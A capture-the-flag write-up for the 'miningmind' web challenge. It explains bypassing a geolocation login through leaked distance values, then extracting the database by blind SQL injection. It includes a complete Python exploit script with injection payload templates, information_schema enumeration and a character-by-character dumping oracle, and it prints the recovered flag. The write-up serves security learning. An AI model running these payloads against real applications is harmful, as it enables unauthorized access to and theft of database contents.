miningmind
==============

Overview
--------
A web application was given where you can get a demo of the MiningMind Inc. product. The idea is that you connect your brain via a usb device to you computer, start the demo and then your brain will mine cryptocurrency. In order to do this you first have to authenticate via geolocation.

Vulnerability
-------------
The programs biggest flaw is its vulnerability to SQL injections. When receiving a POST request on the `/api/usb` endpoint it will not use prepared statements to execute SQL queries and its response contains information about the success of its execution. The attacker can use this to start guessing the contents of any readable part of the applications database. This is eased by the server sending back error codes from the database, this way the attacker is able to see what s/he is doing wrong.  
This endpoint is meant to be gated behind authentication which is easy to trick since it doesn't require any special credentials, you only need to find the location of the companies headquarters which is easy because the authentication response contained information about the distance between that location and the one posted in the request.

Exploitation
------------
After looking at all the websites sources I found the script talking to the `/api/auth` endpoint and tried if I can inject something there.
This didn't yield anything useful since I only got 400s back, at that point I didn't realise that there was an error code from the database in the response body and just wondered what that number inside the `<p>` tag meant.
So next I started looking for the location I could authenticate with to see what the website served to an authenticated user.
I did this with a quick two dimensional ternary search which didn't authenticate me at first since I forgot that the earth is a globe and geographic coordinates are different from euclidean ones.
While I sat there thinking about the shape of our planet and what latitude and longitude represent it occurred to me that I my search only works when I start with easting and then figure out the northing.
This succeeded and gave me a cookie which I would use to authenticate on the site and search for more information which lead me to the next piece of JavaScript which was talking to the `/api/usb` endpoint.
Playing around with this one I found out about the error codes which made it easy to forge a string which would generate a success response.
Using the technique showed in the blind sqli lecture I was now able to guess any value the applications database user had read access to character by character as long as I knew the table and column name.
Since I didn't know any of the database specific table names or where I would find the flag I just started with reading all the table names from the `information_schenma.tables` table.
This took quiet a while since there were 64 rows in that table and the character guessing was not very fast.
After reading all the table names I realised how I can count the rows in a table and that I could have gone in reverse to find the non default tables faster...  
Next I did the same for the column names of the newly found table names and then counted the rows in each of those tables. Since the count for `locations` ran a long time without returning I skipped it and went for the contents of the other two tables.
While there was nothing useful in the `interfaces` I found the flag within the `brains` table.
This is what came back from the query on its `model` column.

    {"class_name": "Sequential", "keras_version": "2.1.6", "flag": "n0t_sur3_my_br4in_is_b3tt3r_than_a_dragonmint", config": [{"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_7", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "dtype": "float32", "activation": "relu", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 12, "batch_input_shape": [null, 8], "use_bias": true, "activity_regularizer": null}}, {"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_8", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "activation": "relu", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 8, "use_bias": true, "activity_regularizer": null}}, {"class_name": "Dense", "config": {"kernel_initializer": {"class_name": "VarianceScaling", "config": {"distribution": "uniform", "scale": 1.0, "seed": null, "mode": "fan_avg"}}, "name": "dense_9", "kernel_constraint": null, "bias_regularizer": null, "bias_constraint": null, "activation": "sigmoid", "trainable": true, "kernel_regularizer": null, "bias_initializer": {"class_name": "Zeros", "config": {}}, "units": 1, "use_bias": true, "activity_regularizer": null}}], "backend": "tensorflow"}"}

This is my exploit script developed for this challenge. While executing it will only dump the flag you can see the commands executed to get to this point and their outputs in the comments of the main function.

    #!/usr/bin/env python3
    import requests
    import string
    import sys


    SESSION = requests.Session()
    BASE_URL = 'https://miningmind.wutctf.space/'
    AUTH_ENDPOINT = BASE_URL + 'api/auth'
    USB_ENDPOINT = BASE_URL + 'api/usb'

    LAT_BOUNDS = (-90, 90)
    LNG_BOUNDS = (-180, 180)
    HEAD_QUARTERS = (-45.423975728378025, -157.47046238434746)


    def post_location(coords):
        lat, lng = coords
        return SESSION.post(AUTH_ENDPOINT, json={
            'latitude': lat,
            'longitude': lng,
        }).json()


    def get_distance(coords):
        return post_location(coords).get('distance')


    def search_coord(bounds, other, prev_dist, pack):
        hi, lo = bounds
        third = (hi - lo) / 3
        left = lo + third
        right  = lo + 2 * third

        left_dist = get_distance(pack(left, other))
        right_dist = get_distance(pack(right, other))

        if left_dist < right_dist:
            hi = right
            coord = left
            dist = left_dist
        else:
            lo = left
            coord = right
            dist = right_dist

        delta = prev_dist - dist
        if delta == 0:
            return coord
        else:
            return search_coord((lo, hi), other, dist, pack)


    def search_lat(lng):
        return search_coord(
            LAT_BOUNDS,
            lng,
            0,
            lambda fst, snd: (fst, snd)
        )

    def search_lng(lat):
        return search_coord(
            LNG_BOUNDS,
            lat,
            0,
            lambda fst, snd: (snd, fst)
        )

    def authenticate():
        print("Authenticating with saved location")
        post_location(HEAD_QUARTERS)
        if SESSION.cookies.get('session') is None:
            print("Saved authentication location not accepted, searching for valid location")
            lng = search_lng(0)
            lat = search_lat(lng)
            print("Location found at {} E {} N".format(lng, lat))
            return post_location((lat, lng)).get('access')


    def probe(response):
        print('\n\trequest:')
        print(response.request.headers)
        print(response.request.body)
        print('\n\tresponse:')
        print(response.status_code)
        print(response.headers)
        print(response.text)


    def post_usb(manufacturer, product):
        return SESSION.post(USB_ENDPOINT, json={
            'manufacturer_name': manufacturer,
            'product_name': product,
        })


    def count_rows(tbl):
        print("Counting rows in table {}".format(tbl))
        QUERY_FMT = "'OR {cnt}=(SELECT COUNT(*) FROM {tbl})) tmp #"
        cnt_found = False
        cnt = 0
        while not cnt_found:
            cnt += 1
            cnt_found = post_usb(
                QUERY_FMT.format(cnt=cnt, tbl=tbl),
                ''
            ).json()['supported']
        return cnt


    def oracle(c, col, pos, tbl, cond, row):
        QUERY_FMT = "'OR BINARY '{c}'=(SELECT MID({col},{pos},1) FROM {tbl} WHERE {cond} LIMIT {row},1)) tmp #"
        payload = QUERY_FMT.format(c=c, col=col, pos=pos, tbl=tbl, cond=cond, row=row)
        response = post_usb(payload, '')
        if response.status_code != 200:
            return False
        return response.json()['supported']

    def dump_value(col, tbl, cond, row):
        value = ""
        hit = True
        i = 0
        while hit:
            i += 1
            hit = False
            for c in string.printable:
                hit = oracle(c, col, i, tbl, cond, row)
                if hit:
                    print(c, end='')
                    sys.stdout.flush()
                    value += c
                    break
            if not hit:
                break
        print()
        return value


    def dump_column(col, tbl, cond):
        print("Dumping values of {col} in table {tbl} where {cond} applies".format(col=col, tbl=tbl, cond=cond))
        values = []
        val = "bogus"
        row = -1
        while len(val) > 0:
            row += 1
            val = dump_value(col, tbl, cond, row)
            values.append(val)
        return values


    def main():
        authenticate()

        # get table names
        # dump_column('table_name', 'information_schema.tables', 'true')
        # [..., 'brains', 'interfaces', 'locations']

        # get column names of the brains table
        # dump_column('column_name', 'information_schema.columns', "table_name='brains'")
        # ['id', 'model']

        # get column names of the interfaces table
        # dump_column('column_name', 'information_schema.columns', "table_name='interfaces'")
        # ['id', 'product', 'manufacturer']

        # get column names of the locations table
        # dump_column('column_name', 'information_schema.columns', "table_name='locations'")
        # ['id', 'longitude', 'latitude']

        # get row count per table
        # count_rows('brains')
        # 1
        # count_rows('interfaces')
        # 4
        # count_rows('locations')
        # ... too many

        # get contents of product column of the interfaces table
        # dump_column('product', 'interfaces', 'true')
        # ['B-ASIC MIND', 'Titan Brain', 'iAxe', 'iHammer']

        # get contents of manufacturer column of the interfaces table
        # dump_column('manufacturer', 'interfaces', 'true')
        # ['MiningMind Inc.', 'MiningMind Inc.', 'Apple Corp.', 'Apple Corp.']

        # get contents of model column of the brains table
        dump_column('model', 'brains', 'true')
        # the flag and a lot of extra stuff

    if __name__ == '__main__':
        main()
